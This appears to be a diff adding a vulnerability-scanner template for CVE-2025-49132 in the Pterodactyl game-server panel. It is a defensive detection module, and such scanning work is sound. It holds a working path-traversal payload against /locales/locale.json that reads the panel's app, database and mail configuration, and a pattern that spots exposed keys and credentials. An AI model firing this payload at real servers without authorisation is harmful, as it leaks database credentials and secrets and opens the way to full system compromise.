@@ -1,0 +1,55 @@
+info:
+  name: pterodactyl_cve_2025_49132_vuln
+  author: Sankalp Bansal
+  severity: 10.0
+  description: >
+    CVE_2025_49132 is a critical vulnerability in Pterodactyl(v.<1.11.11), a free, open
+    -source game server management panel. Using the /locales/locale.json with the locale
+    and namespace query parameters, a malicious actor is able to execute arbitrary code
+    without being authenticated which can lead to complete system compromise.
+  reference:
+    - https://www.exploit-db.com/exploits/52341
+    - https://nvd.nist.gov/vuln/detail/cve-2025-49132
+    - https://github.com/pterodactyl/panel/tree/1.0-develop/config
+  profiles:
+    - http
+    - critical_severity
+    - cve
+    - cve_2025
+    - vuln
+    - pterodactyl
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/locales/locale.json?locale=../../../pterodactyl&namespace=config/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+              paths:
+                - "app"
+                - "database"
+                - "mail"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "\"(key|cipher|debug|connections|host|database|username|driver)\"\\s*:"
+              reverse: false
